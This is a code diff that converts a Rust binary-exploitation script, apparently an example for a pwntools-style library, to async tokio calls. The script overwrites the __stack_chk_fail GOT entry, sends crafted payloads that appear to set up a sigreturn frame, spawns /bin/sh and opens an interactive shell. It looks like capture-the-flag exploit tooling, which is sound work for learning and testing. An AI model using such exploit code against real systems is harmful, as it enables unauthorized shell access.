@@ -6,7 +6,8 @@ use std::{io, time};
 struct Opts {
     elf_file: String,
 }
-fn main() -> io::Result<()> {
+#[tokio::main]
+async fn main() -> io::Result<()> {
     let opts: Opts = Opts::parse();
 
     let mut conn = Process::new(&opts.elf_file)?;
@@ -23,10 +24,10 @@ fn main() -> io::Result<()> {
     payload.ljust(0x10, b'\0');
     payload += P64(pwn.got("__stack_chk_fail").unwrap());
 
-    conn.sendline(payload.as_bytes())?;
+    conn.sendline(payload.as_bytes()).await?;
     std::thread::sleep(time::Duration::from_millis(100));
 
-    conn.sendline(format!("{}", ret).as_bytes())?;
+    conn.sendline(format!("{}", ret).as_bytes()).await?;
     std::thread::sleep(time::Duration::from_millis(100));
 
     let mut payload = Payload::default();
@@ -49,11 +50,12 @@ fn main() -> io::Result<()> {
     payload += P64(0x33);
     payload += P64(0) * 5;
 
-    conn.sendline(payload.as_bytes())?;
+    conn.sendline(payload.as_bytes()).await?;
     std::thread::sleep(time::Duration::from_millis(100));
 
-    conn.send(format!("{}{:A<24}\x0f", "/bin/sh\0", "").as_bytes())?;
-    conn.interactive()?;
+    conn.send(format!("{}{:A<24}\x0f", "/bin/sh\0", "").as_bytes())
+        .await?;
+    conn.interactive().await?;
 
     Ok(())
 }
